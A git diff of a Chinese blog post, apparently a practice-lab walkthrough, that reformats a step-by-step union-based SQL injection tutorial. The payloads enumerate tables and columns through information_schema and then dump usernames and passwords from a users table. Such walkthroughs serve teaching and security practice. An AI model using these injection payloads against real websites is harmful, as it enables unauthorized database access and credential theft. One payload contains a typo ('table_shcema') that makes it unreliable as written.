@@ -43,7 +43,7 @@ What？为什么只显示了当`id=1`的东西。What？真让人头大。只好
 
 试试?
 
->### id=0’ union select 1,2,3%23
+>### `id=0’ union select 1,2,3%23`
 
 OK！出来了。太棒了。开始真正搞事情了。、
 
@@ -51,9 +51,9 @@ OK！出来了。太棒了。开始真正搞事情了。、
 
 数据库有一个连接函数，常用的是`concat`和`concat_ws`。其中`concat_ws`的第一个参数是连接字符串的分隔符。
 
-{% highlight sql %}
-?id=0' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23
-{% endhighlight %}
+
+>### `?id=0' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23`
+
 
 呐。出来了出来了。第一个是当前用户，当前数据库和版本信息。
 
@@ -70,39 +70,31 @@ OK！出来了。太棒了。开始真正搞事情了。、
 
 介绍完就开干。
 
-{% highlight sql %}
-?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'%23
-{% endhighlight %}
+>### `?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'%23`
+
 
 数据库默认显示`limit 0,1`。第一个是`emails`。接着找，用`limit`来偏移。具体如下：
 
-{% highlight sql %}
 
-?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 1,1%23
+>### `?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 1,1%23`
 
-?id=0’ union select 1,2,table_name from information_schema.tables where table_schema='security' limit 2,1%23
+>### `?id=0’ union select 1,2,table_name from information_schema.tables where table_schema='security' limit 2,1%23`
 
-?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'limit 3,1%23
+>### `?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'limit 3,1%23`
 
-{% endhighlight %}
 
 分别是`refers`、`uagents`、`users`。
 
 继续
 
-{% highlight sql %}
 
-?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 4,1%23
-
-{% endhighlight %}
+>### `?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 4,1%23`
 
 报错了。只有三个。可以下一步啦。
 
 我们注入当然就只对用户密码有想法啦。所以去爆破`users`哈哈哈、
 
-{% highlight sql %}
-?id=0' union select 1,2,column_name from information_schema.columns where table_shcema='security' and table_name='users' limit 0,1%23
-{% endhighlight %}
+>### `?id=0' union select 1,2,column_name from information_schema.columns where table_shcema='security' and table_name='users' limit 0,1%23`
 
 不断地偏移。到第四行就报错。也就说有3个字段。
 
@@ -110,8 +102,6 @@ OK！出来了。太棒了。开始真正搞事情了。、
 
 Ok！知道字段就开始获取数据啦。直接`select`出来就好啦。
 
-{% highlight sql %}
-?id=0' union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23
-{% endhighlight %}
+>### `?id=0' union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23`
 
 得到要得到数据。成功。Yeah！
